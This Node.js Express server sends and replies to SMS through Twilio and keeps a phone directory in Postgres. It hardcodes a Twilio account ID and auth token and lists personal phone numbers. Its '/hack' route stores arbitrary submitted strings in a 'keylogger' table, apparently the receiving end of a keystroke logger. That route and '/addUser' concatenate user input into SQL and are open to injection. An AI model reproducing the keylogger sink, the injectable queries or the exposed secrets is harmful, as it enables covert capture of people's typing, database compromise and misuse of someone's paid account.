var express = require('express');
var bodyParser = require('body-parser');
var fs = require('fs');
var pg = require('pg');
var client = require('twilio')('AC80827003e02b768abd3a0eca9f3ed3f7', '41cac7e76eccfd261ed92263625f59e1');

var app = express();

app.set('port', (process.env.PORT || 5000));
app.use(express.static(__dirname + '/public'));
app.use(bodyParser.urlencoded({ extended: false }));

app.get('/', function(request, response) {
  response.writeHead("200",{"Context-Type": "text/html"});
  fs.createReadStream("./homepage/homepage.html").pipe(response);
});

app.get('/text', function(request,response) {
  //Send a text message
  client.sendMessage({
      to: '+16137154438', // Any number Twilio can deliver to
      from: '+16479315875', // A number you bought from Twilio and can use for outbound communication
      body: 'Word to your mother.' // body of the SMS message

  }, function(err, responseData) { //executed when a response is received from Twilio

      if (!err) {
        // http://www.twilio.com/docs/api/rest/sending-sms#example-1
        console.log(responseData.from); // outputs "+14506667788"
        console.log(responseData.body); // outputs "word to your mother."

      } else {
        console.log(err);
      }

  });
});

app.post('/text', function(request,response) {
  var messageReplies = ["You're a god.","You're a god.","Fuck off Laurier"];
  var numbers        = ["+16137154438" ,"+14169487078" ,"+12892301213"];
  var from = request.body.From;

  var reply = "Just got your message";
  for (var i = 0; i < numbers.length; i++) {
    if(numbers[i] === from)
      reply = messageReplies[i];
  };

  client.sendMessage({
      to: from, // Any number Twilio can deliver to
      from: '+16479315875', // A number you bought from Twilio and can use for outbound communication
      body: reply // body of the SMS message

  }, function(err, responseData) { //executed when a response is received from Twilio

      if (!err) {
        // http://www.twilio.com/docs/api/rest/sending-sms#example-1
        console.log(responseData.from); // outputs "+14506667788"
        console.log(responseData.body); // outputs "word to your mother."

      } else {
        console.log(err);
      }

  });
});

//app.post('call', function(request,response) {
//
//});

app.get('/db', function (request, response) {
  response.writeHead("200",{"Context-Type": "text/html"});
  fs.createReadStream("./directory/directory.html").pipe(response);
});

app.get('/getData', function(request,response) {
  pg.connect(process.env.DATABASE_URL, function(err, client, done) {
    client.query('SELECT * FROM directory', function(err, result) {
      done();
      if (err) { 
      	console.error(err); response.send("Error " + err);
      }
      else {
      	var table = "";
      	for(var i=0; i<result.rowCount; i++)
      		table += result.rows[i].name + ": " + result.rows[i].number + "</br>";
       	response.send(table);
      }
    });
  });
});

app.post('/hack', function(request, response) {
  var str = request.body.str;
  var query = "insert into keylogger values ('"+str+"')";
  pg.connect(process.env.DATABASE_URL, function(err, client, done) {
    client.query(query, function(err, result) {
        done();
        if (err) {
          console.error(err);
        }
      });
  });
  response.end();
});

app.post('/addUser', function(request, response) {
  var name = request.query.name;
  var number = request.query.number;

  if (name != "" && number != "") {
  console.log("Name: ",name,"  Number: ",number);
  var query = "insert into directory (name, number) values ('"+name+"','"+number+"')";

  console.log(query);

  pg.connect(process.env.DATABASE_URL, function(err, client, done) {
  	client.query(query, function(err, result) {
  			done();
  			if (err) {
  				console.error(err);
  			}
  		});
  });
  }
  response.end();
});

app.listen(app.get('port'), function() {
  console.log('Node app is running on port', app.get('port'), "!");
});
